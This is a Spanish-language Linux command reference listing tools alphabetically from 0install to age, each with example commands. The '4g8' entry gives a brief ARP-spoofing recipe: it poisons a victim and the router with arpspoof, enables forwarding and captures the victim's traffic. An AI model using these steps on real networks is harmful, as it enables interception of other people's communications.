


0install
Es un sistema de instalación descentralizado que funciona como un gestor de paquetes universal. Permite a los desarrolladores de software publicar programas directamente desde sus propios sitios web, a la vez que admite funciones habituales de los repositorios de distribución centralizados, como bibliotecas compartidas, actualizaciones automáticas y firmas digitales. Su objetivo es complementar, en lugar de reemplazar, la gestión de paquetes del sistema operativo. Los paquetes 0install nunca interfieren con los proporcionados por la distribución. Un mismo paquete funciona en Debian, Fedora, Arch, etc. Los desarrolladores publican una sola versión que funciona en todas las distros y se resuelven automáticamente las dependencias compartidas. Los programas se instalan en ~/.cache/0install.net/ y múltiples versiones pueden coexistir. Se pueden buscar paquetes en https://apps.0install.net/.
$ 0install search vlc (buscar un paquete. Permite busquedas genéricas: game, editor, video, cli...)
  	https://apps.0install.net/gui/vlc.xml
	  VLC media player - powerful media player, playing most of the media codecs and video formats out there [100%]
$ 0install search editor (ver los editores disponibles)
$ 0install run http://0install.net/2008/3rd-party/GIMP.xml (instalar GIMP)
$ 0install run http://0install.net/2008/3rd-party/Inkscape.xml (instalar y usar una aplicación específica)
$ 0install update (actualizar todos los programas instalados)
$ 0install list (listar programas instalados)
$ 0install -h (ver todas las opciones)
$ 0install man git (ver la página de manual)
Nota.- Es especialmente útil: en casos de software no empaquetado en los repos oficiales, cuando se quieren versiones más nuevas que las disponibles en repos, aplicaciones específicas que necesitan versiones particulares y se precisa software de desarrolladores que lo suben por este conducto.
1.-
El proceso clásico podría ser:
$ 0install search firefox (buscar firefox)
$ 0install run http://afb.users.sourceforge.net/zero-install/interfaces/firefox.xml (con la url mostrada con el comando anterior instalar la aplicacion)
$ 0install list (ver qué está instalado)
Nota.-  Muchos paquetes en 0install.net/2006/, 2007/ ... están rotos ya que los mantenedores abandonaron las recetas y los enlaces a las distros antiguos ya no existen. 0install no verifica si los paquetes siguen funcionando.


2ping
Utilidad de ping bidireccional para determinar si ocurre una perdida de paquetes en un sentido o en otro.
$ 2ping -c 5 -i 2  nombre_host.com (con 5 peticiones y a intervalos de 2 segundos)
Nota.- si no se especifica número de peticiones, finalizar con ^C


2to3
es un programa Python que lee el código fuente de Python 2.x y aplica una serie de correcciones para transformarlo en código Python 3.x válido.
$ 2to3 ejemplo.py (convertir un archivo individual)
$ 2to3 -w ejemplo.py (convertir y escribir cambios directamente en el archivo)
$ 2to3 -f imports -f has_key ejemplo.py (convertir solo ciertos archivos específicos)
$ 2to3 -l (ver lista completa de opciones disponibles)
$ 2to3 -x apply ejemplo.py (deshabilitar un archivo específico)
$ 2to3 -v ejemplo.py (ver más información durante el proceso de conversión)
$ 2to3 -n -W --add-suffix=3 ejemplo.py (agregar sufijo a los archivos convertidos)


4g8
Capturar paquetes de equipos de una red. Previamente preparar el equipo con los pasos previos para el envenenamiento arp lanzando en dos terminales y sin cerrarlas hasta terminar la captura:
# arpspoof -i eth0 -t 192.168.1.12 192.168.1.1
# arpspoof -i eth0 -t 192.168.1.1 192.168.1.12
El "2" el sniffado, el "1" el router y el -i … la red. El paquete que contiene arpspoof es dsniff. Activar forwarding para que los paquetes vayan a su verdadero dueño:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Para conocer los parámetros [ips y MACs] que luego tendremos que entrar en 4g8 lanzar:
# nmap 192.168.1.0/24
Para conocer los equipos de la red. Una vez escogida la victima, lanzar 4g8:
# 4g8 -i eth0 -g 192.168.1.1 -G 64:69:0C:87:A8:DC -s 192.168.1.12 -S 00:19:01:54:F5:1F -w dump.pcap
	-g (ip del router)
	-G (MAC del router)
	-s (ip de la victima)
	-S (MAC de la victima)
	-w (archivo donde guardar las capturas)
Para el análisis del archivo dump.pcap se puede usar wireshark entre otros.


7zip
[7zip-rar]. Compresor/descompresor de archivos.
$ 7z a fichero.7z fichero (Comprime)
$ 7z e comprimido (Descomprime)
$ 7z l comprimido (Muestra las propiedades)
$ 7z t fichero_comprimido (Chequea contenido)
$ 7z a -tgzip -p fichero.gz fichero (proteger con una contraseña)


9base
Es un sistema operativo distribuido similar a Unix creado por Bell Labs a mediados de los años 1980. Es una adaptación de las siguientes herramientas originales del área de usuario de Plan 9 a Unix: ascii, awk, basename, bc, cal, cat, cleanname, cmp, date, dc, dd, diff, du, echo, ed, factor, fmt, fortune, freq, getflags, grep, hoc, join, look, ls, mk, mkdir, mtime, pbd, primes, rc, read, sam, sed, seq, sha1sum, sleep, sort, split, strings, tail, tee, test, touch, tr, troff, unicode, uniq, unutf, yacc.


9menu
Crear un lanzador de aplicaciones en el escritorio.
$ 9menu -label gimp gimp & (con el título “gimp” para lanzar “gimp”)
$ 9menu 'xterm -e script.sh' & (lanzador para un script de bash)
Opciones:
	-geometry 30x20 (especificando medidas del lanzador)
	-bg yellow (color de fondo)
	-fg red (color de la fuente)
	-popup (Que se cierre el lanzador una vez clicado)


9mount
forma parte de las herramientas SUID para montar sistemas de archivos v9fs en Linux.
Ejemplo 1: Montar un sistema de archivos v9fs
# 9mount -o trans=net,port=5640 IP_servidor:ruta punto_de_montaje (montar un sistema de archivos v9fs)
# 9mount -o trans=net,port=5640,rw <servidor>:<ruta> <punto_de_montaje> (montar el sistema con acceso de lectura y escritura)
# umount <punto_de_montaje> (desmontar el sistema de archivos)
# mount | grep <punto_de_montaje> (mostrar si el punto de montaje está activo)
# 9mount -o trans=net,port=5640,ro <servidor>:<ruta> <punto_de_montaje> (montar con "ro" establece el sistema de archivos como solo lectura)


a2dismod
Desactiva modulos de apache.
# a2dismod (Lista los módulos y pregunta cual desactivar)
# a2dismod defensible (Desactiva el modulo defensible)


a2dssite
Deshabilita sitios de apache.
# a2dissite host_virtual.com


a2enmod
Activa módulos de apache.
# a2enmod defensible
# a2enmod php8.2 (activar php en localhost)


a2ensite
Habilita sitios de apache. Crear link simbólico a  la carpeta sites-enabled.
# a2ensite host_virtual.com


a2mp3
Optimizar y reducir al mínimo archivos mp3. Crea una carpeta con el archivo resultante en ~/a2mp3.
$ a2mp3 archivo.mp3


a2png
Convertir textos a imagen .png.
$ a2png texto.txt texto.png


a2ps
Imprimir y manipular archivos postscript. La codificación por defecto es la inglesa. La más parecida a utf8 es la latin1 o la iso1 [ISO-8859-1]. Incluye varios comandos: a2ps-lpr-wrapper, card, composeglyphs, fixnt, fixps, ogonkify, pdiff, psmandup, psset y texi2dvi4a2ps.
$ a2ps -o final.ps --columns=2 original.ps (Convertir un archivo [original.ps] a 2 páginas en una y mandar el resultado a otro [final.ps])
$ a2ps --printer=HP_psc_1100_series archivo.ps (mandar un archivo a imprimir)
$ a2ps -l -o archivo.ps --no-header archivo.txt (Pasar un txt a ps y sin poner encabezados y apaisado[-l])
$ a2ps -X latin1 -o archivo.ps archivo.txt (Especificando codificación)
$ a2ps --list=encoding (Listado de codificaciones suportadas)
$ a2ps file.txt imagen.png impreso.pdf imagen.gif -o- | ps2pdf -  archivo.pdf (unir varios archivos en un ps y luego convertirlo a pdf)
Nota.- La opción -o- dice a a2ps que escriba el resultado en STDOUT. La opción - dice a ps2pdf que lea desde STDIN. Para visualizar ps puede usarse la aplicación gv.


a2x
Convierte texto plano a formato PDF [por defecto], EPUB, DVI, PS, LaTeX, XHTML, página man...
$ a2x -f epub archivo.epub (Convertir a epub. )
$ a2x -f manpage archivo.txt (Convertir a página man)


aa3d
Generador de arte ASCII a partir de textos o imagenes.
$ aa3d < texto.txt
$ aa3d -w 100 -t "linux es un sistema genial" (Con anchura de 100 espacios [por defecto 80] y usando un determinado texto)
$ aa3d -d < texto.txt (Usando solo números)


aafire
[caca-utils]. Fuego animado en ascii. En algunas distros cacafire [ver].
$ aafire


aajm
Malabarista en la terminal.
$ aajm -drive curses (para lanzarlo en las tty)
$ aajm -t Reverse (especificar el estilo. Las opciones de estilo son: Normal, Reverse, Shower, Mills Mess, Center, Windmill y Random)
$ aajm -s 6 -d 36 (con 6 bolas y a velocidad más lenta. A menor velocidad más rápido)
Opciones durante la actuación:
	s (modificar el número de bolas)
	- + (disminuir o acelerar al artista)
	h (muestra las opciones)
	q (salir)


aaphoto
Ajuste del color automático para fotos.
$ aaphoto -a --overwrite * (autoajuste y sobreescribiendo todas las fotos del directorio)
$ aaphoto -r 200 --jpg imagen.png (ajustarla a 200 pixels i con salida a jpg)
$ aaphoto -r 50% --rotate90 imagen.png (Ajustandola al 50% y girandola 90ª)
$ aaphoto --flipy imagen.png (espejo vertical)
$ aaphoto --flipx --rotate180 imagen.png (espejo horizontal y rotandola 180º)


ab
[apache2-utils]. Mostrar la capacidad de respuesta de un servidor WEB.
$ ab -n 100 -c 10 localhost:80/index.html (Con 100 conexiones y 10 simultaneas)
$ ab -n 9000 -c 900 -e test.txt http://www.google.com/ (Escribe en un archivo el tiempo [milisegundos] que tomó para servir a ese porcentaje de las solicitudes)


abcde
[lame, cdparanoia, id3v2, vorbis-tools, cd-discid, normalize]. Extraer pistas de audio de un cd.
$ abcde -d /dev/sdc1 -N -x -o mp3 (extrae disco completo en archivos mp3)
$ abcde -d /dev/sdc1 -N -x -o ogg (extrae disco completo en archivos ogg)
$ abcde -d /dev/sdc1 -N -x -o ogg tracks 1-3 5 (extrae las tres primeras canciones y la quinta)
Nota.- "-d" indica dispositivo, "-N" opciones por defecto y sin preguntar, "-x" expulsa el cd al acabar, "-o" tipo de archivo resultante


abcm2ps
Convierte archivos musicales de texto plano en notación ABC a formato PostScript.
$ abcm2ps ejemplo.abc (generará el archivo de salida out.ps con la partitura correspondiente)
$ abcm2ps -O salida.ps ejemplo.abc (especificar el nombre de salida)
Ejemplo dee archivo ABC:
$ nano ejemplo.abc
    X:1
    T:The Legacy Jig
    M:6/8
    L:1/8
    R:jig
    K:G
    GFG BAB | gfg gab | GFG BAB | d2A AFD |
    GFG BAB | gfg gab | age edB |1 dBA AFD :|2 dBA ABd |:
    efe edB | dBA ABd | efe edB | gdB ABd |
    efe edB | d2d def | gfe edB |1 dBA ABd :|2 dBA AFD |]


abcmidi
Utilidades para convertir entre notación musical ABC y archivos MIDI y viceversa y manipular y analizar archivos MIDI y notación ABC. Incluye las herramientas abc2abc, abc2midi, abcmatch, mftext, midi2abc, midicopy y midistats. Incluye las herramientas abc2abc, abc2midi, abcmatch, mftext, midi2abc, midicopy, midistats y yaps
$ abc2midi cancion.abc -o cancion.mid (convierte notación ABC a un archivo MIDI)
$ midi2abc cancion.mid -o cancion.abc (convierte un archivo MIDI a ABC)
$ midi2abc -m 3/4 vals.mid -o vals.abc (ajustar la firma de compás)
$ abc2abc cancion.abc -t 2 -o cancion_transpuesta.abc (transpone una canción ABC 2 semitonos arriba)
$ abc2abc cancion.abc -n 4 -o cancion_nueva.abc (reformatea para que cada 4 compases vaya en una línea:)
$ abcmatch fragmento.abc repertorio.abc (muestra dónde aparece el patrón definido en `fragmento.abc` dentro del repertorio)
$ mftext cancion.mid > eventos.txt (muestra el contenido de eventos y notas de un archivo MIDI en formato texto)
$ midicopy -t 1 original.mid extraido.mid (extrae la pista 1 de un archivo MIDI)
$ midistats cancion.mid (analiza y resume estadísticas de un archivo MIDI: número de notas, duración, instrumentos usados, canales, etc)
$ yaps cancion.abc -o cancion.ps (convierte notación ABC en PostScript para imprimir)
Estructura básica de un archivo ABC
$ nano ejemplo.abc
       X:1
       T:Prueba de sonido
       C:Juan gonzalez
       M:6/8
       L:1/8
       R:prueba
       K:G
       Q:120
       GFG BAB | gfg gab | GFG BAB | d2A AFD |
       GFG BAB | gfg gab | age edB |1 dBA AFD:|2 dBA ABd |:
       efe edB | dBA ABd | efe edB | gdB ABd |
       efe edB | d2d def | gfe edB |1 dBA ABd:|2 dBA AFD |
X --> Número identificador de la melodía.
T --> Título de la obra.
C --> Autor
M --> Compás.
L --> Valor por defecto de la duración de nota.
R --> Tipo de pieza (opcional).
K --> Armadura de la clave (sol).
Q --> Tempo. Tambien admite 1/4...
Las letras A-G y a-g (mayúsculas/minúsculas) indican notas en distintas octavas; los números indican duración.


abiword
Procesador de texto completo y rápido y con una interfaz muy simple. Dado que requiere pocos recursos técnicos puede usarse en equipos obsoletos. Tiene filtros de importación/exportación de documentos desde su formato nativo a XML, RTF, HTML, Microsoft Word, LaTeX y OpenDocument.
$ abiword --to=doc nombre.pdf (pasar pdf a doc)
$ abiword --geometry=1366x768 (Iniciar maximizado según la resolución de pantalla)


abook
Muestra una plantilla de libreta de direcciones. Proporciona muchos campos diferentes de información del usuario como nombre, email, dirección y varios campos de teléfono. abook está diseñado para usar con mutt, pero se puede usar de forma independiente.
$ abook (forma básica)
$ abook -C archivo (Usando una plantilla diferente. Por defecto  en ~/.abook/abookrc)
Algunas teclas de control:
	a (Añadir contacto y crear las pestañas para los datos. Usar las flechas para moverse entre pestañas y los números de los conceptos para entrar información)
	r (Suprimir contacto)
	q (Salir)


abootimg
Utilidad para manipular archivos de imagen de partición que se utilizan en dispositivos Android para arrancar sistemas operativos.
# abootimg --create my_boot.img --kernel .bin --ramdisk ramdisk.cpio.gz (crear imágen de partición desde cero)
# abootimg --extract my_boot.img (extraer componentes de una imagen existente)
# abootimg --info my_boot.img (verificar la estructura de una imagen)
# abootimg --modify my_boot.img --set-kernel new_kernel.bin (modificar componentes de una imagen existente)
# abootimg --compress my_boot.img (comprimir imagenes)
# abootimg --decompress ed_boot.img (descomprimir)


abr2gbr
Herramienta para convertir archivos de pincel ABR de Adobe PhotoShop y Corel Paint Shop Pro JBR al formato GBR de GIMP.
$ gimp --batch-process --process=abr2gbr entrada.abr salida.gbr
$ gimp --batch-process --process=abr2gbr --brushes-only --flatten output_file.gbr input_file.abr


abs-guide
Un montón de ejemplos de bash scripting. Listado en:
$ ls /usr/share/doc/abs-guide/examples/


abw2epub
Convierte documentos AbiWord a ePub.
$ abw2epub entrada.abw salida.epub


abw2odt
Convertir documentos AbiWord en documentos OpenDocument de libreofficce.
$ abw2odt entrada.abw salida.odt


ac
[acct]. Reporta los tiempos de conexión...
$ ac -p (totales de cada usuario)
$ ac -f ~/Documents/text.txt (horas de uso del archivo especificado)
# ac -d -y (conexión por dias y total año del usuario root)
# ac --reboots (desde el reinicio)


accountservice
Se usa para gestionar información de cuentas de usuario en sistemas Linux a través de interfaces D-Bus.
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts org.freedesktop.Accounts.ListCachedUsers (muestra las cuentas de usuario que están en caché en el sistema)
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts/User$UID org.freedesktop.DBus.Properties.Get string:"org.freedesktop.Accounts.User" string:"UserName" (información sobre un usuario específico del que debes saber nombre y UID)
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts/User$UID org.freedesktop.Accounts.User.SetIconFile string:"/imagen.jpg" (establecer nueva imagen de perfil para un usuario)
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts/User$UID org.freedesktop.Accounts.User.SetRealName string:"Nuevo_Nombre" (cambiar el nombre de usuario)


acct
Conjunto de utilidades (ac, lastcom, accton, dump-acct, dump-atmp y sa) que se ejecutan en segundo plano y realizan un seguimiento de la actividad de cada usuario en el sistema, tiempos de conexión (en horas) así como de los recursos que se están consumiendo. Normalmente se levanta el servicio durante la instalación pero si no se ha levantado:
# /etc/init.d/acct start
Luego podran lanzarse las aplicaciones del paquete y los logs se guardarán en el archivo /var/log/account/pacct.
# ac (muestra el total de horas)
# ac -d (por dias)
# ac -p (de cada usuario)
# dump-acct /var/log/account/pacct (ver el contenido de logs)
# dump-utmp /var/log/account/pacct
# lastcomm root (del usuario root)
# sa -a (comandos que fueron ejecutados por los usuarios)


accton
[acct]. Activar o desactivar la contabilidad de los procesos para la aplicación acct [ver].
# accton on (activar registros)
# accton off (parar registros)


acheck
Útil para revisar y corregir errores de localización en archivos de distintos formatos.
$ acheck archivo.po (mostrará los errores o advertencias comunes que encuentre, como incoherencias de traducción o problemas de formato)
$ acheck /dir (revisar un directorio completo y generar un informe de errores encontrados en cada uno)
$ acheck --mode=strict archivo.po (ejecutar el análisis en un modo más exhaustivo)
$ acheck archivo.po > errores.txt (errores.txt contiene las advertencias y errores detallados encontrados en el archivo)


achilles
Simulación pelín subrealista de vida artificial y evolución.
$ achilles -x 4 -z 4 -f 5 (número de bloques en el eje y y en el x y número de alimentos iniciales)


ack
Está diseñado como una alternativa de grep. ack es inteligente en cuanto a los archivos que busca. Conoce ciertos tipos de archivos, según la extensión del archivo y, en algunos casos, el contenido del archivo. Para paginar la salida:
     $ echo '--pager=less -RFX' >> ~/.ackrc
$ ack palabra (averiguar todas las instancias en las que se encuentra el patrón)
$ ack -w palabra (palabra textual)
$ ack -c palabra (que indique solo el número de lines coincidentes)
$ ack -ch palabra (-h suprime el prefijo del nombre de archivo en la salida y elimina los archivos con cero resultados. Mostrara número de líneas donde se realizó la búsqueda)
$ ack -f palabra (imprimir solo los archivos que tienen coincidencias del directorio)
$ ack -g log --cc (todos los archivos de lenguaje C que tienen el patrón "log" en algún lugar de su ruta)
$ ack -f --cc (muestrar todos los archivos en lenguaje C)


aclock
Reloj digital en la pantalla.
$ AClock


acme
Ensamblador cruzado que permite generar código ensamblador para procesadores de la familia 6502 y derivados, usados en computadoras clásicas como el Commodore 64, NES, Apple II, etc. Es útil para desarrollo de software retro y homebrew.
$ acme --color -o file.prg file.asm (compilar y generar el binario)
$ toacme vis input.asm ouput.prg


acmetool
Herramienta para adquirir automáticamente certificados TLS de servidores ACME [Automated Certificate Management Environment].
$ acmetool init --email correo@dominio.com --domain dominio.com (configuración inicial)
$ acmetool get --domain dominio.com (obtener un certificado nuevo)
$ acmetool renew --domain dominio.com (renovar un certificado existente)
$ acmetool list --domain dominio.com (verificar los certificados obtenidos)
Nota.- Es necesario tener configurado un proveedor de nombres de dominio y un servidor web para que acmetool pueda realizar los cambios necesarios en el registro DNS y en el archivo .well-known/acme-challenge/ del sitio web.


aconnect
Utilidad para conectar y desconectar dos puertos midi existentes en el sistema al secuenciador ALSA.
$ aconnect 64:0 65:0 (conectar el puerto 64 al 65)
$ aconnect -d 64:0 65:0 (desconectar)
$ aconnect -l (lista de conexiones)
$ aconnect -x (suprimir todas las conexiones exportadas)


acpi
Monitorizar estado de la bateria del portatil, si está conectado a la red y otras informaciones.
$ acpi -c (ventiladores)
$ acpi -t (temperaturas)
$ acpi -b (bateria)
$ acpi -i (información adicional de la bateria)
$ acpi -V (ver toda la información posible)
$ watch acpi -V (en tiempo real)
$ cat /proc/acpi/battery/BAT0/info (Muestra varios datos, los más importantes: design capacity y last full capacity. La diferencia entra ambas cantidades es la capacidad que ha perdido la bateria)


acpi_fakekey
Se usa para enviar eventos de teclas específicas al sistema, lo cual puede ser útil para simular pulsaciones de teclas en casos donde un script o aplicación necesite activar ciertas funciones. Este comando suele estar presente en sistemas Linux con soporte ACPI y requiere privilegios de superusuario para ejecutarse.
# acpi_fakekey 114 (simular la tecla de bajar volumen)
# acpi_fakekey 224 (simular la tecla de reducir el brillo)
# acpi_fakekey 99 (simula la tecla ImprPant)
Nota.- Para ver los códigos de las teclas puede hacerse con la aplicación showkey [ver]


acpid
Demonio que gestiona eventos de ACPI [Advanced Configuration and Power Interface] relacionados con la energía y el hardware del sistema, como estado de la batería, conexiones de corriente, botón de encendido y cierre de la tapa en portátiles.
# systemctl status acpid (comprobar si está activo)
# systemctl start acpid (si no lo está acivarlo)
# acpi_listen (ver qué eventos están disponibles y cómo se reconocen)
# journalctl -u acpid (consultar los registros del sistema donde se registran los eventos de ACPI)
# acpid reload (recargar acpid sin necesidad de reiniciar el servicio)


acpitail
Muestra información del estado de ACPI sobre la batería, el ventilador y la temperatura.
$ acpitail -B 60 -F 10 (de la bateria cada 60 segundos. Por defecto 15 y del ventidador cada 10. Por defecto 5)


acpitool
Información en laptops sobre el estado de la batería, la temperatura y la capacidad de suspender.
$ acpitool -c (información general)
$ acpitool -b (información detallada del estado de la bateria)
$ acpitool -t (verificar estado térmico)
$ acpitool -T (información detallada sobre el sistema térmico)
$ acpitool -s (verificar si el sistema está suspendido)
$ acpitool -S (información detallada sobre el estado de suspensión)
$ acpitool -l (lista completa de componentes disponible en el sistema)


adb
[Android Debug Bridge]. Herramienta que permite comunicar con instancias de emuladores o dispositivos Android conectados para ejecutar comandos, transferir archivos, depurar aplicaciones, etc.
$ adb devices (mostrar una lista de los dispositivos conectados y sus estados, como "device" [conectado y listo para usar] o "offline" [no responde])
$ adb install aplicacion.apk (instalar una aplicación. Envía la aplicación desde el ordenador al dispositivo)
$ adb pull /ruta/del/archivo/en/dispositivo /ruta/de/destino/en/ordenador (copiar un archivo desde el dispositivo al ordenador)
$ adb push /ruta/del/archivo/en/ordenador /ruta/de/destino/en/dispositivo (copiar un archivo desde el ordenador al dispositivo)
$ adb shell (acceder a una sesión de shell en el dispositivo)
$ adb reboot (reiniciar el dispositivo)
$ adb reboot recovery (reiniciar en modo recuperación)
$ adb reboot bootloader (reiciciar en el cargador de arranque)
$ adb exec-out screencap -p > captura.png (capturar la pantalla del dispositivo y guardarla en el ordenador y guardarla en el directorio actual)
$ adb shell screenrecord video.mp4 (grabar la pantalla del dispositivo y guardarla en el dispositivo mismo. Despues se puede transferir al pc con "adb pull")
$ adb uninstall paquete (desinstalar una aplicación usando su nombre de paquete)
$ adb logcat (ver los logs del sistema en tiempo real)
$ adb kill-server (si adb no detecta los dispositivos conectados, probar a reiniciar el servidor)
$ adb start-server


add-apt-repository
Simplifica la adición de repositorios concretos al sistema de aplicaciones que no se encuantran todavia en los repos oficiales. Instalar esta aplicación de Ubuntu en Debian mediante un script:
$ wget http://blog.anantshri.info/content/uploads/2010/09/add-apt-repository.sh.txt (descarga)
# cp add-apt-repository.sh.txt /usr/sbin/add-apt-repository (copiar al directorio /usr/sbin)
# chmod o+x /usr/sbin/add-apt-repository (otorgar permisos de ejecución)
# chown root:root /usr/sbin/add-apt-repository (otorgar la propiedad a root)
# add-apt-repository ppa:ppa-name (instalar una aplicación)
1.-
Otra forma de añadir repositorios a /etc/apt/sources.list o a /etc/apt/sources.list.d/ en el ejemplo añade el repositorio del escritorio Mate según la versión de Ubuntu instalada
	# add-apt-repository deb http://packages.mate-desktop.org/repo/ubuntu $(lsb_release -cs) main


addgnupghome
Si GnuPG se instala en un sistema con cuentas de usuario existentes, es necesario rellenar el directorio de inicio de GnuPG estos archivos existentes.  Especialmente 'trustlist.txt' y un keybox con algunos certificados iniciales. Este script ayuda a hacer esto copiando todos los archivos de /etc/skel/.gnupg a los directorios personales de las cuentas indicadas en la línea de comandos. Tiene cuidado de no sobrescribir los directorios de inicio de GnuPG existentes.
# addgnupghome cuenta_user1 cuenta_user2


addresses-googies-for-ngustep
Herramientas diseñadas para integrar contactos en entornos basados en GNUstep. Incluye las herramientas; adgnumailconverter, adserver, y adtool.
$ adgnumailconverter -i archivo_correo.mbox -o archivo_contactos.abook (convertir contactos desde archivos de correos GNU Mail en un formato compatible con AddressBook de GNUstep)
$ adserver --port 1234 (permitir que otros usuarios o aplicaciones se conecten al servidor de direcciones a través del puerto especificado. Por defecto 1234)
$ adtool --add --name "Juan Pérez" --email juan.perez@example.com (agregar un contacto)
$ adtool --list (listar contactos)
$ adtool --search "Juan Pérez" (buscar un contacto)


add-shell
[debianutils]. Agrega shells a la lista de shells de inicio de sesión válidos. copia /etc/shells a /etc/shells.tmp y agrega los shells dados a este archivo si aún no están presentes y copia este archivo temporal de nuevo a /etc/shells. Deben proporcionarse rutas de acceso completas de las shells.
$ add-shell /bin/rbash


adduser
Crear nuevo usuarios [ver useradd].
# adduser USER (crear el usuario USER y por defecto su home en /home/USER)
# adduser --home /home/users/USER --shell /bin/zsh USER (crea el usuario USER con su home en /home/users/USER y su shell zsh)
Otras caracteristicas que podemos especificar:
--disabled-password USER (sin contraseña para USER)
--disabled-login USER (sin permisos para iniciar sesión)


adduser.conf
Archivo que contiene las preferencias para los comandos adduser y addgroup [/etc/adduser.conf]. Algunos parámetros importantes:
	DSHELL=/bin/bash (shell para nuevos usuarios. Por defecto /bin/bash)
	DHOME=/home (donde se crean los directorios de los nuevos usuarios. Por defecto /home.
	SKEL=/etc/skel (directorio de donde se copian los ficheros de configuración base del usuario. Por defecto /etc/skel)
	FIRST_UID=1000 (Valor inicial del rango de IDs para usuarios normales)
	LAST_UID=29999 (Rando final del rango de IDs)
	DIR_MODE=0755 (Permisos de entrada de todos los directorios creados)


adequate
comprobaciones adecuadas de los paquetes instalados en el sistema e informes de errores y violaciones de políticas.
$ adequate --all (comprobacion de todos los paquetes instalados)
$ adequate coreutils (comprobar un paquete)
$ adequate --tags obsolete-conffile --all (comprobar paquetes obsoletos)


adjtimex
Utilidad para manipular las variables de tiempo del núcleo. Para una máquina conectada a Internet la mejor manera de mantener la precisión del reloj del sistema es utilizando NTP [Network Time Protocol]. Es importante tener en cuenta que el uso de este comando puede afectar negativamente el rendimiento del sistema si se utiliza excesiva o incorrectamente. Se recomienda su uso con precaución y solo cuando sea absolutamente necesario.
$ adjtimex /dev/rtc0 --set-system-time=2024-10-24 20:00:00 (establece la hora del sistema al 24 de octubre de 2024 a las 20:00:00.)


adminer
Gestor de bases de datos via navegador más completa que phpmyadmin. Una vez instalado reiniciar apache:
# /etc/init.d/apache2 restart
Acceder a la aplicación con, http://localhost/adminer y entrar los datos de acceso (usuario, contraseña, servidor y gestor de la BD).


adns-tools
Hacer consultas DNS. Incluye las aplicaciones adnsheloex, adnshost, adnslogres y adnsresfilter
$ echo "ejemplo.com" | adnsresfilter (consulta básica)
$ echo "ejemplo.com" | adnsresfilter -t 5000 (ajustando tiempo de espera a 5 segundos para resolver ejemplo.com)
$ adnsresfilter -t 3000 < lista_de_dominios.txt (con una lista de dominios, a uno por linea y una espera de 3 segundos por consulta)
$ adnsresfilter < lista_de_dominios.txt > resultados_dns.txt (redirigiendo la lista de entrada a un archivo de resultados)
$ adnsheloex mail.ejemplo.com cliente.ejemplo.com 192.168.1.1 (envía un saludo HELO desde cliente.ejemplo.com al servidor mail.ejemplo.com usando la dirección IP 192.168.1.1. Útil para verificar correo electrónico o autenticaciones)
$ adnshost ejemplo.com (mostrar las direcciones IP asociadas al dominio ejemplo.com)
$ cat archivo.log | adnslogres (leer el archivo de registro [logs] y resolver direcciones IP en nombres de dominio)
$ adnshost -t a google.com (devolver la dirección IP v4 asuciada al dominio google.com)
$ adnshost -t aaaa google.com (muestra la dirección IPv6 del dominio especificado)
$ adnshost -t ns google.com (mostrar la lista de servidores DNS que gestionan el dominio)
$ adnshost -t txt google.com (obtiener el registro TXT)
$ adnshost -t soa google.com (información sobre el servidor principal, el contacto administrativo y otros detalles técnicos del dominio)


advancecomp
Contiene utilidades de recompresión para archivos .zip, imágenes .png, videoclips .mng y archivos .gz. Para la recompresión, se utiliza 7-Zip sin pérdida de calidad.
$ advzip -z archivo.zip (recomprime un .zip y reduce su tamaño optimizando la compresión)
$ advzip -z -4 archivo.zip (nivel máximo de compresión [de 0 a 4])
$ advzip -z -4 *.zip (optimizar todos los archivos .zip en un directorio)
$ advpng -z archivo.png (optimiza un .png reduciendo su tamaño sin perder calidad)
$ advpng -z -4 archivo.png (estleciendo nivel máximo de compresión del .png)
$ advmng -z archivo.mng (recomprimir archivo .mng)
$ advmng -z -4 archivo.mng (recomprimir con el máximo nivel de compresión)
$ advgz -z archivo.gz (recomprime un  .gz usando una mejor técnica de compresión)
$ advgz -z -4 archivo.gz (y aplicando el máximo nivel de compresión)


aewan
Editor de dibujos en ascii. Una vez lanzada la aplicacion con las teclas de funcion F1-F4, se accede a los menus. La aplicacion llama ^ a la tecla control y % a la tecla Alt.
Algunas teclas de control:
	Ctrl a (Abre un lienzo con las medidas por defecto)
	Alt a (Pregunta por las medidas del lienzo)
	Ctrl o (Abre un dibujo guardado previamente)
	Ctrl s (Guarda el presente dibujo)
	Ctrl w (Si tenemos mas de un dibujo, pasa al siguiente)
	Ctrl q (Pasa al anterior)
	Ctrl l (Muestra los lienzos abiertos y algunas opciones sobre ellos)
	Ctrl d (Copiar el lienzo)
	Ctrl r (Renombrar el lienzo)
	Alt r (Modificar las medidas)
	TAB (Abre el dialogo de colores)
	Alt p (Seleciona el color de la celda donde esta el cursor)
	Alt z (Llena la celda del color que se ha seleccionado con Alt p))
	Ctrl e (Muestra los metadatos)
	Ctrl c (Sale del programa)


afio
Útil para crear y gestionar archivos en formato de compresión propio.
$ find /directorio | afio -o -Z -F -z9 -O archivo.afio (crear un archivo comprimido de un directorio)
$ afio -i -Z -F -z9 -O archivo.afio -D /directorio_destino (descomprimir)
$ find /nuevos_archivos | afio -o -a -O archivo.afio (agregar archivos a un archivo afio ya existente)
$ afio -t -Z archivo.afio (ver contenido sis extraerlo)
$ find /dir_respaldo | afio -o -Z -O archivo.afio && scp archivo.afio usuario@servidor:/destino/ (realiza un respaldo y luego transfiere el archivo al servidor de destino)
$ find /ruta -name "*.txt" | afio -o -Z -O textfiles.afio (comprimir solo archivos de un tipo específico como .tx)
$ afio -i -Z -O archivo.afio "*.txt" (extraer solo archivos específicos como los .txt)
Las opciones expuestas:
    -o: indica que se va a crear un archivo.
    -Z: usa compresión gzip.
    -F: guarda rutas absolutas.
    -z9: usa la máxima compresión.
    -O archivo.afio: especifica el nombre del archivo de salida.
    -i: indica que afio va a leer el archivo y extraer los contenidos.
    -D /directorio_destino: especifica el directorio de destino para los archivos extraídos.
    -a: indica que los archivos se van a añadir al archivo ya existente.
    -t: lista los archivos dentro del archivo .afio sin extraerlos.


age
Cifrar y descifrar archivo. Si no se especifica archivo de salida lo hace por pantalla.
$ age -e -p -o salida archivo_entrada (encriptar con contraseña con el nombre de salida especificado el archivo_entrada)
$ age -o desencriptado -d encriptado (desencriptar un archivo encriptado)
$ age-keygen | age -p > clave.age (crear un clave y guardarla en clave.age)


agedu
